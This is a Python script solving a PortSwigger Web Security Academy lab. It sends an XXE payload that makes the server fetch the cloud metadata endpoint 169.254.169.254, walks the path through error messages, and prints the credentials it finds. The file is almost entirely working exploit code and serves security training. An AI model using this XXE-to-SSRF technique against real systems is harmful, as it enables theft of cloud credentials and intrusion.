import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
import re

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
# author: 0xyf


class XXE2:
    def __init__(self):
        self.lab_id = "0a6e00e903778e5281121b7000f3001d"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"

    def execute_request(self, data):
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def xxe(self):
        path = ""
        while True:
            internal_url = f"http://169.254.169.254{path}"
            xxe_payload_1 = (
                f"""<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{internal_url}"> ]>"""
            )
            xxe_payload_2 = "&xxe;"
            data = f"""<?xml version="1.0" encoding="UTF-8"?>{xxe_payload_1}<stockCheck><productId>{xxe_payload_2}</productId><storeId>1</storeId></stockCheck>"""
            print(f"[+] payload: {data}")
            r = self.execute_request(data)
            if len(r.content) > 50:
                print(r.text)
                break
            else:
                new_path = self.get_path(r)
                path += f"/{new_path}"
                print(f"[+] new_path: {new_path}")

    @staticmethod
    def get_path(r):
        key_pattern = r"Invalid product ID: (.*)\""
        match = re.findall(key_pattern, r.text)[0]
        return match

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.xxe()
        self.check_solved()


def main():
    XXE2().solve()


if __name__ == "__main__":
    main()
